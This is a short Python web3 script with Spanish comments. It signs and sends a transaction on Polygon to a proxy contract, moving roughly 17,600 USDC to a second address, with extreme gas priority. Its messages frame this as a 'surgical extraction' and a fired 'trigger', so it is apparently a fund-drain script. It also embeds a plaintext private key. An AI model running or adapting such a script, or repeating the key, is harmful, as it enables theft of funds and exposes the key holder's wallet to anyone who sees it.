import time
from web3 import Web3

# 1. CONEXIÓN (Polygon RPC)
w3 = Web3(Web3.HTTPProvider('https://polygon.drpc.org'))

# 2. COORDENADAS
proxy = w3.to_checksum_address('0x3AC05161b76a35c1c28dC99Aa01BEd7B24cEA3bf')
nodo_b = w3.to_checksum_address('0x79D79B1cE83e32f35798ad1A3C8DBB101B6F3291')
nodo_a = w3.to_checksum_address('0xB9073c07648a414B875874d7B8599dD2fAa171E8')
KEY_A = '589f10559f34606f99abd479688d8be9501d08a2e51f7c6895024839c49f656a'

def disparar():
    print("🚀 REMI: Iniciando extracción quirúrgica en Polygon...")
    # Selector f3ae2415 + Nodo B + Monto USDC (6 decimales)
    data = "0xf3ae2415" + nodo_b[2:].lower().zfill(64) + "0000000000000000000000000000000000000000000000000000000418960200"
    
    nonce = w3.eth.get_transaction_count(nodo_a)
    gas_price = w3.to_wei('500', 'gwei') # Prioridad ultra-alta

    tx = {
        'from': nodo_a,
        'to': proxy,
        'nonce': nonce,
        'data': data,
        'gas': 120000,
        'gasPrice': gas_price,
        'chainId': 137
    }

    signed = w3.eth.account.sign_transaction(tx, KEY_A)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"✅ GATILLO ACCIONADO. Hash: {tx_hash.hex()}")

if __name__ == "__main__":
    disparar()
